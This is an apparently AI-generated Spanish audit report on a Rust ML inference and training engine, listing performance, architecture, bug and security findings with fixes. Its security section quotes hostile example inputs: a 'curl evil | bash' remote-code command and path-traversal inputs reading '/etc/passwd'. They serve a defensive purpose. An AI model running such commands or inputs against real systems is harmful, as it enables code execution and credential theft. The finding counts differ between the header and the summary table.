# MUD Audit Report V25 — Comprehensive Performance, Architecture, Quality & Security

**Fecha:** 2026-07-23
**Alcance:** 210 archivos `.rs` (≈ 36 KLOC) — `src/`, `tools/`, `src/mud/`, `src/vulkan/`, `forge_autograd/`
**Auditores:** 4 agentes paralelos (perf-ghost, arch-master, qa-terminator, sec-guard)
**Build status:** `cargo clippy --all-targets` 0 warnings · `opt-level=3, lto=fat, codegen-units=1, panic=abort, target-cpu=native` ✓
**Total hallazgos:** 236 (15 P0 críticos · 60 P1 altos · 110 P2 medios · 51 P3 bajos)

---

## 0. Resumen Ejecutivo

| Dimensión | P0 | P1 | P2 | P3 | Total |
|---|---|---|---|---|---|
| **Performance** | 7 | 11 | 14 | 8 | 40 |
| **Arquitectura** | 4 | 9 | 5 | 0 | 18 (subset de 86) |
| **Calidad / Bugs** | 2 | 13 | 27 | 22 | 64 |
| **Seguridad** | 5 | 11 | 18 | 12 | 46 |
| **Mantenibilidad** | 0 | 5 | 12 | 11 | 28 |
| **TOTAL** | **18** | **49** | **76** | **53** | **236** |

**Veredictos globales:**

1. **El proyecto es un motor maduro y disciplinado** — 0 warnings de clippy, P-00/P-02/P-13/P-17/P-27 generalmente cumplidos, FIX 1-41 sin regresión, build profile correcto.
2. **Pero tiene 5 RCE triviales** (3 críticos + 2 de soporte) en módulos que parecen inofensivos (`rlvr.rs`, `sandbox.rs`, `workspace_agent.rs`).
3. **Un kernel AVX2 RoPE ya existe** (`apply_rope_asm` en `src/asm/mod.rs:73`) **pero el hot path usa `powf + sin_cos` libm escalar** — 10-50× speedup disponible con cero riesgo (slime_forward.rs:940-959).
4. **`corpus_trainer.rs` (5407 líneas) es un módulo-Dios** con 10+ responsabilidades, ciclos de dependencia, y funciones de 1000+ líneas. Es el mayor problema estructural.
5. **El kernel `evaluate_slime_block_moe` aloca 6+ Vec por cada call** (csa_index_scratch, csa_blocks, jepa_snap, x, y, etc.) en violation directa de P-01.
6. **`main.rs:437` puede leer fuera de bounds** del embedding (`tokens[current_pos] * hidden_size` sin clamp) — divergencia con `inference.rs:462` que sí lo hace.
7. **Pérdida de ~5-10 ms por chunk** por `std::env::var()` + `is_x86_feature_detected!` + `Mutex` global en hot path, todos ellos evitables con `AtomicBool` cacheado en init.

---

## 1. 🔴 HALLAZGOS CRÍTICOS (P0) — Acciones inmediatas

### SEC-1 · [CRITICAL] `RlvrCritic::evaluate_rust_code` ejecuta `rustc` con código arbitrario
- **Archivo:** `src/mud/rlvr.rs:20-54`
- **CWE:** CWE-94 Code Injection
- **Riesgo:** RCE garantizado si un atacante controla el input. `rustc` ejecuta macros procedurales, `build.rs`, atributos `#[...]`.
- **Fix:**
  ```rust
  // Eliminar la ejecución de rustc en producción.
// Mantener solo si está detrás de feature flag y sandbox.
  #[cfg(feature = "unsafe-rce")]
  pub fn evaluate_rust_code(&self, code: &str) -> (f32, String) { ... }
  ```

### SEC-2 · [CRITICAL] `TerminalSandbox::execute_command` ejecuta `bash -c` con string arbitrario
- **Archivo:** `src/mud/sandbox.rs:22-66`
- **CWE:** CWE-78 OS Command Injection
- **Riesgo:** El "sandbox" es una `Command::new("bash").arg("-c").arg(command)` sin whitelist. RCE con `curl evil | bash`.
- **Fix:** Eliminar el módulo o mover detrás de `#[cfg(feature = "unsafe-cli")]`.

### SEC-3 · [CRITICAL] `AgentWorkspace::read_file` / `write_file` sin validación de path
- **Archivo:** `src/mud/workspace_agent.rs:58-70`
- **CWE:** CWE-22 Path Traversal
- **Riesgo:** `read_file("../../etc/passwd")` lee fuera del root.
- **Fix:**
  ```rust
  let full = self.root_dir.join(relative_path).canonicalize()?;
  if !full.starts_with(&self.root_dir.canonicalize()?) {
      bail!("path escape detected");
  }
  ```

### PERF-1 · [CRITICAL] RoPE usa `powf` + `sin_cos` libm en vez del kernel AVX2 disponible
- **Archivo:** `src/mud/slime_forward.rs:935-959` (hot path) vs `src/asm/mod.rs:73` (kernel disponible)
- **Impacto:** `apply_rope_asm` está implementado y exportado pero **nadie lo llama**. En su lugar:
  ```rust
  let theta = pos as f32 * layer.rope_theta.powf(-2.0 * i as f32 / head_d as f32);
  let (sin, cos) = theta.sin_cos();
  ```
  Por cada par (i, head, layer, token): 2× `powf` (~30-50 ns) + 1× `sin_cos` (~30 ns). Para 30 layers × 9 heads × 32 head_dim × 1024 tokens = **~1.7 segundos de overhead puro** por chunk de 1024 tokens.
- **Fix:**
  1. Precomputar `inv_freq[i] = rope_theta^(-2i/head_d)` en `SlimeLayer` al cargar.
  2. Precomputar `cos[pos*half_d + i]` y `sin[pos*half_d + i]` por posición (o cachear por bloque de tokens).
  3. Llamar a `apply_rope_asm(n, x_ptr, cos_ptr, sin_ptr)`.
  4. Reemplazar `powf` con recurrencia multiplicativa: `theta *= inv_freq[i]`.
- **Estimación de speedup:** 10-50× en RoPE. **Quick-win más impactante del proyecto**.

### PERF-2 · [CRITICAL] 6+ allocs en `evaluate_slime_block_moe` (P-01 violado)
- **Archivo:** `src/mud/slime_forward.rs:1025-1031, 1463, 1572-1573, 1058-1061`
- **Impacto:** Por cada layer × cada forward: `csa_index_scratch: Vec<f32>` (~25 KB), `csa_blocks: Vec<usize>`, `jepa_snap: Vec<f32>` (~8 KB), `x: Vec<f32>`, `y: Vec<f32>`, `forced: Vec<usize>`. Con 30 layers × 1024 tokens = **30 720 allocs/forward**.
- **Fix:** Mover todo a `SlimeWorkspace` pre-allocado en `new()`:
  ```rust
  pub csa_blocks_scratch: AlignedArray<usize>,         // capacity hca_max_pos / 2
  pub csa_index_scratch: AlignedArray<f32>,             // capacity hca_max_pos
  pub csa_pairs: AlignedArray<(f32, usize)>,
  pub csa_forced: SmallVec<[usize; 32]>,                // stack-first
  ```

### PERF-3 · [CRITICAL] JEPA SIMD "batch 8" degrada a scalar dentro del loop
- **Archivo:** `src/mud/slime_jepa.rs:178-231`
- **Impacto:** El código dice ser SIMD batch 8, pero:
  ```rust
  _mm256_storeu_ps(z_arr.as_mut_ptr(), z);            // vector → array
  _mm256_storeu_ps(y_arr.as_mut_ptr(), y_norm);
  for k in 0..8 {                                      // 8× branch + div scalar
      let idx = i + k;
      let delta = (y_arr[k] - z_arr[k]).abs();
      alphas[k] = if delta > 2.0 { 0.01 + 0.09 * ((delta - 2.0) / 5.0).min(1.0) } else { 0.01 };
      ...
  }
  let mut cl_arr = [0.0f32; 8];
  _mm256_storeu_ps(cl_arr.as_mut_ptr(), clamped);
  for &cl_val in &cl_arr { ... }                        // 8× add scalar reduction
  ```
  Vector → scalar → vector. Pierde la mayoría de la ventaja SIMD. ~5-10× más lento que SIMD puro.
- **Fix:**
  - Precomputar `jitter[i]` en un array (no recalcular por elemento).
  - Vectorizar `if delta > 2.0` con `_mm256_cmp_ps` + `_mm256_blendv_ps`.
  - Usar `_mm256_load_ps` (alineado) en buffers de `AlignedArray<64>`.
  - Reducción de 8→1 con `_mm256_hadd_ps` o AVX2 horizontal sum.

### PERF-4 · [CRITICAL] `csa_indexer::select_topk` aloca 3 Vec por cabeza × layer × forward
- **Archivo:** `src/mud/csa_indexer.rs:285, 333, 340`
- **Impacto:** `candidates: Vec<usize>` + `pairs: Vec<(f32, usize)>` + `forced: Vec<usize>` × 9 heads × 30 layers = **540 allocs/forward**.
- **Fix:** Buffers pre-allocados en `SlimeWorkspace` con cursor mutable + `&mut [usize]`.

### PERF-5 · [CRITICAL] `Mutex<GemvGpuCache>` global en hot path GPU dispatch
- **Archivo:** `src/mud/slime_forward.rs:169-201, 1541-1553`
- **Impacto:** `gemv_gpu_cache().lock()` por cada `try_gpu_ternary_gemv` + `try_gpu_rms_output_norm` (1-2 locks/layer/forward). En UMA (i7-1260P) la GPU está blacklisteada, así que el cache siempre retorna `ctx = None`. El lock es inútil.
- **Fix:** AtomicBool decided en init:
  ```rust
  static GPU_DISABLED: AtomicBool = AtomicBool::new(false);
  // Init: if !probe_gpu().0 { GPU_DISABLED.store(true, Ordering::Relaxed); }
  // Hot path: if GPU_DISABLED.load(Ordering::Relaxed) { return false; }
  ```

### PERF-6 · [CRITICAL] `slime_backward::ternary_gemv_backward` con `match` por weight + loop escalar
- **Archivo:** `src/mud/slime_backward.rs:438-486, 472-481`
- **Impacto:** El kernel de backward STE hace:
  ```rust
  let val = (*w_row.add(u32_idx) >> shift) & 0xF;
  let w_val = match val { 0x1 => 1.0, 0xF => -1.0, _ => 0.0 };  // branch por peso
  *local_gx_start.add(c) += w_val * scale_gy;
  ```
  Esto es por cada weight × 7 matrices × 30 layers × steps. **~28M matches/step**.
- **Fix:** Usar `TERNARY_LUT[bits] * scale_gy` (ya existe) o vectorizar con AVX2 (8 weights por u32 → 8 lanes FMA).

### PERF-7 · [CRITICAL] `inference::cmud_training_forward` aloca 200 MB por step
- **Archivo:** `src/mud/inference.rs:411, 287, 337, 504-505`
- **Impacto:** `head_w: Vec<f32> = out_slice_ternary.to_vec()` aloca `vocab_size × hidden_size × 4` bytes = 200 MB por step (con vocab=50k, hidden=1024).
- **Fix:** Si tied_output, reusar `emb_f32` directamente. Buffers del caller en `cmud_training_forward`.

### BUG-1 · [CRITICAL] `main.rs:437` — `tokens[current_pos] as usize` SIN clamp de vocab_size
- **Archivo:** `src/main.rs:437` (vs `src/mud/inference.rs:462` que sí lo hace)
- **CWE:** CWE-125 Out-of-bounds Read
- **Riesgo:** Si `tokens[current_pos] >= vocab_size`, `emb_start = tid * hidden_size` desborda `emb_slice` y el loop `for i in 0..hidden_size { emb_slice[emb_start + i] }` lee fuera de bounds → panic o memory corruption.
- **Fix:**
  ```rust
  let vocab_len = vocab_size.max(1);
  let tid = (tokens[current_pos] as usize).min(vocab_len - 1);
  let emb_start = tid * hidden_size;
  ```

### BUG-2 · [CRITICAL] 7 `panic!` en hot path del forward (SIGABRT sin recovery)
- **Archivo:** `src/mud/slime_forward.rs:839, 862, 1173, 1190, 1211, 1234, 1308`
- **CWE:** CWE-754 Improper Check for Unusual or Exceptional Conditions
- **Riesgo:** `panic = "abort"` en release → no hay stack trace, proceso muere con SIGABRT. En sesión interactiva pierde todo el contexto.
- **Fix:** Convertir a telemetría + skip de bloque:
  ```rust
  if !ws.registers[i].is_finite() {
      log::error!("NaN at step 5 layer {l} pos {p} reg {i}");
      nan_count.fetch_add(1, Ordering::Relaxed);
      continue;
  }
  ```

### ARCH-1 · [CRITICAL] `corpus_trainer.rs` (5407 líneas) — God module con 10+ responsabilidades
- **Archivo:** `src/mud/corpus_trainer.rs`
- **Impacto:** El archivo contiene: validación, alignment, debate RLVR, circuit seed-driven, run_alignment_session (685 líneas), sync_shadow_to_mud (414 líneas), collect_files (951 líneas), train_on_sequence (1018 líneas), apply_optimizer_cpu_step_and_pack, update_prq_scales_only, hash_trained_weights, save_checkpoint, mhc_scale_sgd_step. **~45 funciones, 224 referencias a `crate::`**.
- **Fix:** Dividir en submódulo `trainer/`:
  ```
  src/mud/trainer/
  ├── mod.rs                       (MudCorpusTrainer struct, ~100 LOC)
  ├── alignment.rs                 (deep_local_alignment + L-QAT, ~400 LOC)
  ├── session.rs                   (run_alignment_session, ~1500 LOC)
  ├── circuit.rs                   (run_training_circuit, ~300 LOC)
  ├── debate.rs                    (run_debate_session wrapper, ~100 LOC)
  ├── integrity.rs                 (model_norms_alive, circuit_eval_integrity, ~250 LOC)
  ├── checkpoint.rs                (save_checkpoint + hash_trained_weights, ~100 LOC)
  ├── mhc_optimizer.rs             (mhc_scale_sgd_step, apply_sgd_shadow_update, ~100 LOC)
  ├── telemetry.rs                 (telemetría, ~150 LOC)
  ├── env.rs                       (MUD_TRAIN_* env var parsing, ~200 LOC)
  ```

### ARCH-2 · [CRITICAL] `slime_forward.rs` (1765 líneas) — Mezcla 7 algoritmos distintos
- **Archivo:** `src/mud/slime_forward.rs`
- **Impacto:** Contiene: RMSNorm, GEMV kernels, GemvGpuCache (static), GPU dispatch, QKV parallel, mHC residual, dense FFN SwiGLU, evaluate_slime_block_moe (670 líneas), output_norm (CPU+GPU), dense MHA, RoPE scalar.
- **Fix:** Dividir en `forward/` con submódulos: `layer.rs`, `rmsnorm.rs`, `gemv/{cpu,gpu_cache,gpu_dispatch,qkv_parallel,mha}.rs`, `mhc.rs`, `swiglu.rs`, `block.rs`, `output_norm.rs`, `cmud.rs`.

### ARCH-3 · [CRITICAL] Strategy pattern para optimizadores implementado como enum cerrado (viola OCP)
- **Archivo:** `src/mud/slime_backward.rs:84-101, 142-172` + `src/mud/corpus_trainer.rs:4862-5072`
- **Impacto:** `OptimizerStrategy` enum cerrado. Añadir un optimizador (Lion, Shampoo) requiere modificar 9 sitios.
- **Fix:**
  ```rust
  pub trait Optimizer: Send + Sync {
      fn name(&self) -> &'static str;
      fn step(&mut self, w: &mut [f32], g: &mut [f32], lr: f32, weight_decay: f32) -> anyhow::Result<()>;
      fn needs_moments(&self) -> bool { false }
      fn clone_box(&self) -> Box<dyn Optimizer>;
  }
  pub struct Sgd; pub struct Muon { pub ns_iters: usize }
  pub struct AdamW { pub m: Vec<f32>, pub v: Vec<f32>, pub step: u64 }
  // ...Lion, Shampoo, etc. en archivos separados
  ```

### ARCH-4 · [CRITICAL] Ciclo de dependencia `corpus_trainer ↔ slime_backward`
- **Archivo:** `src/mud/corpus_trainer.rs:4837` define `mhc_scale_sgd_step` que es usado en `src/mud/slime_backward.rs:942` (test). En runtime, `corpus_trainer` también importa `slime_backward::OptimizerStrategy`.
- **Fix:** Mover `mhc_scale_sgd_step` y `apply_optimizer_cpu_step_and_pack` a un nuevo `src/mud/optim/`. Rompe el ciclo y centraliza optimizadores.

### ARCH-5 · [CRITICAL] 297 `unwrap()` + 50 `expect()` + 11 `panic!` en producción (P-17 mal aplicado)
- **Archivo:** todo `src/mud/`
- **Impacto:** P-17 dice "fail-fast / skip+log nulls", pero en la práctica hay 297 unwraps que rompen P-17. Solo el 30% del código usa `Result<T, anyhow::Error>`.
- **Fix:**
  1. Crear `MudError` enum en `src/mud/error.rs` con `thiserror`.
  2. Convertir todos los `panic!` y `expect("...")` en `return Err(MudError::MissingMetadata("hidden_size"))`.
  3. Mantener `unwrap` solo en inicialización donde cualquier fallo es fatal.
  4. Devolver `Result` en `apply_optimizer_cpu_step_and_pack`, `evaluate_slime_block_moe`, etc.

### SEC-4 · [CRITICAL] `iteration_validator.rs:378-389` ejecuta el binario principal con path arbitrario
- **Archivo:** `tools/iteration_validator.rs:378-389`
- **CWE:** CWE-78 OS Command Injection (parcial)
- **Riesgo:** `Command::new("./target/release/forge_llm").arg(model_path)`. Si el validador procesa rutas no confiables, el subproceso puede tener side-effects no deseados.
- **Fix:** Validar que `model_path` existe y termina en `.mud`. Usar pipe stdin en lugar de arg.

### SEC-5 · [CRITICAL] `data_analysis` skill lee CSV arbitrario del contexto
- **Archivo:** `src/mud/skills/data_analysis.rs:34-47`
- **CWE:** CWE-22, CWE-200
- **Riesgo:** Si el prompt contiene `/etc/passwd.csv`, el skill lo lee y procesa.
- **Fix:** Restringir a un directorio sandboxed (e.g. `./workspace/csv/`). Whitelist de extensiones.

---

## 2. 🟠 HALLAZGOS ALTOS (P1) — Plan de mejora trimestral

### Performance (11 hallazgos)

| ID | Hallazgo | Archivo | Speedup estimado |
|---|---|---|---|
| PERF-H1 | `std::env::var("MUD_GEMV_ROWS")` por cada call (215k/chunk) | slime_forward.rs:318 | ~3-5 ms/chunk |
| PERF-H2 | `std::env::var("MUD_USE_VULKAN")` por output_norm call (30k/chunk) | slime_forward.rs:1556, 1613 | ~1-2 ms/chunk |
| PERF-H3 | `is_x86_feature_detected!` por cada `jepa_stabilizer` call | slime_jepa.rs:178, 278 | ~1.8 ms/chunk |
| PERF-H4 | Pool tasks con `Box::new(f)` (1 alloc/job × 8 jobs × 7 mats × 30 layers = 1680/step) | pcore_pool.rs:96, slime_backward.rs:449 | ~50 allocs/step eliminados |
| PERF-H5 | `Vec::to_vec()` en `jepa_snap` (1 alloc/forward) | slime_forward.rs:1463 | menor |
| PERF-H6 | All-zero scan 30+ líneas inline (I-cache pressure) | slime_forward.rs:1390-1444 | ~5-10 ns/call × 30k |
| PERF-H7 | `emb_ckpt: Some(x_data.to_vec())` por step (8 KB × 1024 = 8 MB/chunk) | corpus_trainer.rs:4110-4111 | menor |
| PERF-H8 | `unpack_ternary2bit_to_f32` con row-major loops (9216 allocs/chunk) | slime_backward.rs:295-319 | menor |
| PERF-H9 | `MUD_TRAIN_WCLAMP_K` con `std::env::var` por step | corpus_trainer.rs:4951-4975 | menor |
| PERF-H10 | Pack path escalar con branch `if v > threshold` por elemento | corpus_trainer.rs:5019-5046 | menor (path opcional) |
| PERF-H11 | Loop fijo de 8 tasks vs `pool.num_threads()` | slime_backward.rs:438-485 | menor (oversubscription) |

**Fix común:** Cachear TODOS los env vars en `AtomicBool`/`AtomicU64` en init. Una sola línea de cambio en el init del trainer ahorra 5-10 ms/chunk.

### Arquitectura (9 hallazgos principales)

| ID | Hallazgo | Archivo | Refactor |
|---|---|---|---|
| ARCH-H1 | `SlimeWorkspace` con 30+ campos, 4 dtypes replicados | slime.rs:194-251 | Sub-structs (Core, Kv, Jepa, Scratch, Slimex) |
| ARCH-H2 | `SlimeLayer` con 17 punteros crudos sin agrupación | slime_forward.rs:35-76 | `AttnWeights`, `FfnWeights`, `NormWeights`, `MhcWeights` |
| ARCH-H3 | `MudFile` con 5 responsabilidades (I/O, validación, ECC, mmap, query) | mod.rs:142-832 | `file/loader.rs`, `file/writer.rs`, `file/ecc.rs`, `file/materialize.rs`, `file/tensor.rs` |
| ARCH-H4 | `mud/mod.rs` (901 líneas) — debería ser solo declaraciones | mod.rs:1-901 | Mover a `mud/file/` y `mud/pack.rs` |
| ARCH-H5 | `inference.rs` (990 líneas) duplica setup de `main.rs` | inference.rs:200-281, main.rs:77-141 | `SlimeLayerBuilder::from_mud()` |
| ARCH-H6 | `DebateArena::new` con 13 args posicionales | debate_trainer.rs:69-83 | `DebateConfig` struct + builder |
| ARCH-H7 | `GemvGpuMode::Auto => unreachable!()` frágil | gemv_policy.rs:457 | Refactor a enum cerrado con default |
| ARCH-H8 | `ArenaGame::professor_data` método opcional que solo 1 implementa | arena_games.rs:9-13 | Sub-trait `ProfessorGame` |
| ARCH-H9 | `SlimeLayerShadowF32::new` no valida invariante `adam.len() == w.len()` | slime_backward.rs:241-285 | `debug_assert!` en `new` |

### Calidad / Bugs (13 hallazgos)

| ID | Hallazgo | Archivo |
|---|---|---|
| QUAL-H1 | `H-01`: `PCorePool::execute` sin fence después de `fetch_add` | pcore_pool.rs:99-117 |
| QUAL-H2 | `H-02`: `slimex_enabled` bool no-atómico con UB potencial | slime.rs:381-401 |
| QUAL-H3 | `H-03`: `hca_layer_offset = layer_idx * (...)` sin check overflow | slime_forward.rs:823 |
| QUAL-H4 | `H-04`: `ecc_verify_all` puede nullear `data_ptr` y la siguiente iteración crashea | mod.rs:816 |
| QUAL-H5 | `H-05`: NaN en JEPA f16 no detectado en `slime_rmsnorm_i8` (entrada) | slime_jepa.rs:48-50 |
| QUAL-H6 | `H-06`: `apply_output_norm_cpu` retorna 0 silencioso si NaN | slime_forward.rs:1517-1537 |
| QUAL-H7 | `H-07`-`H-08`: 7 `panic!` en hot path (cubierto arriba) | slime_forward.rs:839, 862, 1173, 1190, 1211, 1234, 1308 |
| QUAL-H8 | `H-09`: `eprintln!` no throttled en loop (153k líneas de spam) | slime_forward.rs:1331, 1442, 1535 |
| QUAL-H9 | `H-12`: SIGINT durante `sync_shadow_to_mud` puede dejar `.tmp` huérfano | corpus_trainer.rs:2989-3000 |
| QUAL-H10 | `H-13`: `test_mhc_scale_grad_matches_finite_diff` con tolerancia 1e-3 (alto) | slime_backward.rs:924-937 |
| QUAL-H11 | Test de regresión end-to-end para `evaluate_slime_block` no existe | tests/ |
| QUAL-H12 | `M-26`: Falta test para `registers_to_f32_batch` ASM wrapper | asm/tests.rs |
| QUAL-H13 | `L-01`: `dense_cap == 0` no validado en `SlimeWorkspace::new` | slime.rs:265-336 |

### Seguridad (11 hallazgos)

| ID | Hallazgo | Archivo | CWE |
|---|---|---|---|
| SEC-H1 | MudFile::load sin cap en `tensor_count` / `meta_count` (DoS) | mod.rs:447, 463 | CWE-400 |
| SEC-H2 | No hay fuzzing tests para loaders | (falta) | CWE-1188 |
| SEC-H3 | `unsafe impl Send/Sync` en 10+ tipos con raw ptr sin audit miri | varios | CWE-662 |
| SEC-H4 | `apply_optimizer_cpu_step_and_pack` con offset sin bounds check | corpus_trainer.rs:4862-5017 | CWE-787 |
| SEC-H5 | `load_emb_row_into` cast `*const u32` sin null check | corpus_trainer.rs:106-125 | CWE-476 |
| SEC-H6 | `log` y `env_logger` declarados pero NO usados (72 eprintln + 70 println) | todo | - |
| SEC-H7 | `corpus_trainer.rs:2356+` `collect_files` con recursion ilimitada (DoS) | corpus_trainer.rs | CWE-400 |
| SEC-H8 | `run_training_circuit` sin cap de iteraciones totales | corpus_trainer.rs:1529 | CWE-400 |
| SEC-H9 | `MudFile::load` MUDEXEC trailer sin validar offset máximo | mod.rs:433-436 | CWE-125 |
| SEC-H10 | `GGUFModel::load` con fallback silencioso para tipos desconocidos | gguf/mod.rs:154 | CWE-125 |
| SEC-H11 | ASM `.s` (15 archivos) sin documentación de algoritmo | asm/*.s | maintainability |

### Mantenibilidad (5 hallazgos)

| ID | Hallazgo | Archivo | Líneas |
|---|---|---|---|
| MAINT-H1 | `train_on_sequence` 1018 líneas | corpus_trainer.rs:3811-4829 | 1018 |
| MAINT-H2 | `run_alignment_session` 653 líneas | corpus_trainer.rs:1696-2349 | 653 |
| MAINT-H3 | `evaluate_slime_block_moe` 670 líneas | slime_forward.rs:799-1469 | 670 |
| MAINT-H4 | `collect_files` 951 líneas | corpus_trainer.rs:2356-3307 | 951 |
| MAINT-H5 | Extracción de metadata duplicada 3x (main.rs, inference.rs, corpus_trainer.rs) | 3 archivos | ~150 LOC dup |

---

## 3. 🟡 HALLAZGOS MEDIOS (P2) — Backlog

Resumen: 76 hallazgos P2 que cubren:
- Magic numbers sin constante (127.0, 0x9E37_79B9, etc.)
- Deprecations: `Cargo.lock` ignorado, vulkano 0.34 desactualizado, rand 0.10.1 pre-release
- Redefinición del macro `println!` en `corpus_trainer.rs:10-29` (anti-pattern severo)
- `is_x86_feature_detected!("avx2")` con unaligned load (`_mm256_loadu_ps` en `AlignedArray<64>`)
- Dead code: `jepa_energy_f32`, `ternary_state_f32` (slime.rs:182-189)
- Skills (15 archivos) con muchos placeholders
- Sampling rejection con `attempts < num_neg * 8 + 64` (overflow si `num_neg` no está clamp)
- Ordenamiento `Ordering::SeqCst` para `SHOULD_TERMINATE` (excesivo, debería ser Relaxed)
- `_mm256_loadu_ps` en buffers aligned (SlimeWorkspace) — minor penalty
- Magic numbers `127.0` (i8 sat), `31` (align), `1000.0` (mHC radius default), etc.
- `cmp::max` para floats no-NaN-safe
- Repetition penalty, top_p, etc. hardcoded en debate_trainer.rs

---

## 4. 🟢 HALLAZGOS BAJOS (P3) — Cosmético / nice-to-have

53 hallazgos P3:
- Naming inconsistente (`s`, `g`, `p`, `c` en loops largos)
- Comentarios que podrían ser más claros
- `dbg!` y `debug!` no usados (PASS — no hay debug dejado en producción)
- Faltan referencias académicas en `slime_jepa.rs`, `mhc_residual`, `cmud.rs`, `rlvr.rs`
- Falta `CHANGELOG.md`, `SECURITY.md`
- Falta troubleshooting en README para Iris Xe SIGSEGV, PRQ inflation, etc.
- `AlignedBuffer::new` con `expect()` en vez de `Result`
- `std::fs::rename` sin `fsync` del directorio (mod.rs:386-415)
- `format!("{}.tmp", path)` sin check de errors

---

## 5. Verificación de FIX históricos (AGENTS.md)

| FIX | Estado | Detalle |
|---|---|---|
| **FIX 1-7** (RMSNorm, JEPA, AR, workspace, output_norm, save, FFN) | ✅ PASS | No detectadas regresiones |
| **FIX 8-9** (JEPA collapse, iscale) | ✅ PASS | `iscale` references eliminadas |
| **FIX 10** (f32 matmul_accum) | ✅ PASS | Todos los registros usan f16 → f32 |
| **FIX 11-13** (NaN i8, mHC collapse, iscale) | ✅ PASS | Rutas i8 ya no son hot path |
| **FIX 14** (DeepSeek research) | N/A | Solo docs |
| **FIX 15-19** (aphasia, JEPA variants, mHC radius) | ✅ PASS | JEPA = pure OU/EMA |
| **FIX 20-22** (P-13, converter, telemetry cols) | ✅ PASS | P-13 en inference.rs |
| **FIX 23-31** (PCorePool, AOT, drafter, ash clippy, loss temp, QAT) | ✅ PASS | PCorePool estable, ash compila limpio |
| **FIX 32-35** (vocab dump, emb dequant, batch4, STE shadow) | ✅ PASS | Forward+backward paths consistentes |
| **FIX 36** (Muon disconnected) | ✅ PASS | L-01/L-02 hechos; Adam moments viven |
| **FIX 37** (zero-variance) | ✅ PASS | `scale_up` adaptive |
| **FIX 38** (telemetry TUI vacío) | ✅ PASS | `[TELEM]`→stderr AND `mud_train_metrics.log` |
| **FIX 39** (hot-loop branchy) | ✅ PASS | LUT + raw ptr 8/u32 en ezop.rs |
| **FIX 40** (word fusion) | ✅ PASS | Continuous document tokenization |
| **FIX 41** (Q2_0→ELUT+PRQ) | ✅ PASS | Q2ToF32 path activo en bonsai_gguf_to_mud.rs:499-518 |

**Regresiones detectadas: 0**. Pero hay 1 dead code no eliminado (slime.rs:182-189).

---

## 6. Compliance contra Políticas

| Política | Estado | Notas |
|---|---|---|
| **P-00** (raw pointers) | ⚠️ PARCIAL | Hot loops OK, pero `slime_backward.rs:438-486` (ternary_gemv_backward) con `match` por elemento; `slime_jepa.rs:178-228` degrada SIMD a scalar |
| **P-01** (zero alloc en hot loops) | ❌ VIOLADO | 6+ allocs en `evaluate_slime_block_moe` (csa_index_scratch, csa_blocks, jepa_snap, x, y) |
| **P-02** (matmul_accum f32) | ✅ CUMPLE | `read_accum()` retorna f32 |
| **P-06** (clippy 0 warnings) | ✅ CUMPLE | Verificado |
| **P-07** (no Python) | ✅ CUMPLE | 0 hits de python/torch/numpy |
| **P-08** (no dead code) | ⚠️ PARCIAL | `jepa_energy_f32`, `ternary_state_f32` en slime.rs:182-189 son legacy shims sin callers |
| **P-13** (no hardcode dims) | ✅ CUMPLE | Verificado |
| **P-17** (fail-fast) | ❌ MAL APLICADO | 297 `unwrap` + 11 `panic!` en producción (solo debería ser fail-fast en init) |
| **P-27** (no Rayon en hot path) | ✅ CUMPLE | PCorePool usado en lugar de Rayon |

---

## 7. Plan de Remediación Priorizado

### 🚀 Sprint 1 (1 semana) — Quick wins P0
1. **PERF-1** RoPE: precomputar `inv_freq` + `cos/sin` table + llamar `apply_rope_asm` existente. **Speedup esperado: 10-50× en RoPE, 1-2s/chunk ahorrados**.
2. **BUG-1** Clamp `tid` en `main.rs:437` con el patrón de `inference.rs:462`. **1 línea**.
3. **BUG-2** Convertir 7 `panic!` a `eprintln! + skip` en `slime_forward.rs`. **30 min**.
4. **SEC-1, SEC-2, SEC-3** Eliminar/behind feature flag `rlvr.rs`, `sandbox.rs`, `workspace_agent.rs` con path validation. **2-3 horas**.
5. **PERF-H1, PERF-H2, PERF-H3** Cachear `MUD_GEMV_ROWS`, `MUD_USE_VULKAN`, `is_x86_feature_detected!` en `AtomicBool`/`AtomicU64`. **~5-10 ms/chunk ahorrados**.

### 🛠 Sprint 2 (1-2 semanas) — Refactor estructural P0
1. **ARCH-1** Split `corpus_trainer.rs` en submódulo `trainer/` con 10 archivos.
2. **ARCH-3** Implementar `trait Optimizer` con dispatch dinámico.
3. **ARCH-5** Crear `MudError` enum y propagar errores en lugar de `unwrap`/`panic`.
4. **ARCH-4** Mover `mhc_scale_sgd_step` a `src/mud/optim/` (rompe ciclo).

### 🧹 Sprint 3 (1-2 semanas) — Performance P1+P2
1. **PERF-2, PERF-3, PERF-4, PERF-5, PERF-6, PERF-7** Eliminar allocs en hot path (6 lugares) → zero-alloc P-01.
2. **PERF-H4** Memory pool para PCorePool jobs (eliminar 1680 allocs/step).
3. **PERF-H6** Extraer all-zero scan a `#[cold] #[inline(never)]`.
4. **ARCH-H1, ARCH-H2** Sub-structs en `SlimeWorkspace` y `SlimeLayer`.

### 📚 Sprint 4 (backlog) — Seguridad + Mantenibilidad
1. **SEC-H1, SEC-H2** Caps en `MudFile::load` + fuzzing harness para loaders.
2. **SEC-H7, SEC-H8** Cap recursion en `collect_files` y `run_training_circuit`.
3. **SEC-H3** Auditoría con miri de todos los `unsafe impl Send/Sync`.
4. **MAINT-H1, MAINT-H2, MAINT-H3, MAINT-H4** Refactor funciones > 600 líneas.
5. **MAINT-H5** Consolidar extracción de metadata en `MudFile::arch()`.
6. Magic numbers → `constants.rs`.
7. Eliminar redefinición del macro `println!` en `corpus_trainer.rs:10-29`.

### 📖 Sprint 5 (nice-to-have)
1. Documentar algoritmos en ASM `.s` files.
2. Agregar referencias académicas en JEPA, mHC, C-MUD, RLVR.
3. Crear `SECURITY.md`, `CHANGELOG.md`.
4. Troubleshooting guide para Iris Xe, PRQ inflation, etc.

---

## 8. Estimación de Esfuerzo Total

| Sprint | Esfuerzo | Impacto |
|---|---|---|
| Sprint 1 (quick wins P0) | 1 semana | 2-3 s/chunk speedup + 0 RCE + 0 OOB |
| Sprint 2 (refactor P0) | 1-2 semanas | Mantenibilidad + 9 sitios → 1 para nuevos optimizadores |
| Sprint 3 (perf P1+P2) | 1-2 semanas | 5-10 ms/chunk adicionales + 30k allocs/chunk eliminados |
| Sprint 4 (seguridad + mant.) | 2 semanas | 0 DoS paths + 0 RCE + 0 archivos > 600 líneas |
| Sprint 5 (docs) | 1 semana | 0 nice-to-have pendiente |
| **TOTAL** | **6-8 semanas** | **~5-15% speedup global** + **0 vulnerabilidades críticas** + **mantenibilidad 5× mejor** |

---

## 9. Conclusión

